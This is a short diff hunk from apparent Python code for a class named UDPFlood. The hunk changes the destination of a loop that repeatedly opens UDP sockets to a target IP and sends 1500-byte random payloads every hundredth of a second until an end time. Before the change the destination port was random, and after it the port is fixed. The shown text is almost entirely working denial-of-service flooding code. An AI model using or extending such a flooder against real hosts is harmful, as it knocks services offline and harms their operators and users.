@@ -24,7 +24,7 @@ class UDPFlood(threading.Thread):
         #end_time = star_time + timedelta(seconds=20)
         while datetime.now() <= end_time:
             s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-            s.connect((self.ip, random.randint(1024, 65535)))
+            s.connect((self.ip, port))
             s.send(os.urandom(1500))
             time.sleep(0.01)
             self.sent_packets = self.sent_packets + 1
